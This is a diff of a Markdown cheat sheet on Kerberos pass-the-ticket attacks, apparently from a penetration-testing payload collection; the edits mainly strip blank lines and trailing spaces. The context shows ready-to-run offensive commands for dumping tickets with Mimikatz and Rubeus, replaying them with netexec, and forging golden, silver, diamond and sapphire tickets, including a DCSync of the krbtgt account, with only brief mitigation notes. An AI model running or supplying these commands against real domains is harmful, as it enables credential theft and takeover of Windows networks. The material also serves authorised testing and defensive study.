@@ -8,11 +8,11 @@ There are two types of tickets in Kerberos:
 
 * **Service Ticket** (ST): The service ticket is used to access a specific network service or resource. The user presents the service ticket to the service or resource, which then uses the ticket to authenticate the user and grant access to the requested resource. The service ticket contains the user's identity, a timestamp, and an encryption of the service's secret key.
 
-
 ## Dump Kerberos Tickets
 
 * Mimikatz: `sekurlsa::tickets /export`
-* Rubeus 
+* Rubeus
+
   ```ps1
   # List available tickets
   Rubeus.exe triage
@@ -21,12 +21,10 @@ There are two types of tickets in Kerberos:
   Rubeus.exe dump /luid:0x12d1f7
   ```
 
-
 ## Replay Kerberos Tickets
 
 * Mimikatz: `mimikatz.exe "kerberos::ptc C:\temp\TGT_Administrator@lab.local.ccache"`
 * netexec: `KRB5CCNAME=/tmp/administrator.ccache netexec smb 10.10.10 -u user --use-kcache`
-
 
 ## Convert Kerberos Tickets
 
@@ -40,7 +38,6 @@ While both caches serve the same basic purpose of storing Kerberos tickets to en
 
 * kekeo: `misc::convert ccache ticket.kirbi`
 * impacket: `impacket-ticketConverter SRV01.kirbi SRV01.ccache`
-
 
 ## Pass-the-Ticket Golden Tickets
 
@@ -66,7 +63,7 @@ kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-20
 kerberos::tgt
 ```
 
-### Using Meterpreter 
+### Using Meterpreter
 
 ```powershell
 # Get info - Meterpreter(kiwi)
@@ -110,12 +107,10 @@ root@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi veloci
 Converting kirbi => ccache
 ```
 
-
 Mitigations:
 
 * Hard to detect because they are legit TGT tickets
 * Mimikatz generate a golden ticket with a life-span of 10 years
-
 
 ## Pass-the-Ticket Silver Tickets
 
@@ -148,11 +143,9 @@ Interesting services to target with a silver ticket :
 | LDAP operations including Mimikatz DCSync   | LDAP                   | `lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt` |
 | Windows Remote Server Administration Tools  | RPCSS   + LDAP  + CIFS | /      |
 
-
 Mitigations:
 
 * Set the attribute "Account is Sensitive and Cannot be Delegated" to prevent lateral movement with the generated ticket.
-
 
 ## Pass-the-Ticket Diamond Tickets
 
@@ -169,7 +162,6 @@ ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password
 Rubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS
 ```
 
-
 ## Pass-the-Ticket Sapphire Tickets
 
 > Requesting the target user's PAC with `S4U2self+U2U` exchange during TGS-REQ(P) (PKINIT).
@@ -185,7 +177,6 @@ Requirements:
 # baduser argument will be ignored
 ticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_user' -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser'
 ```
-
 
 ## References
 
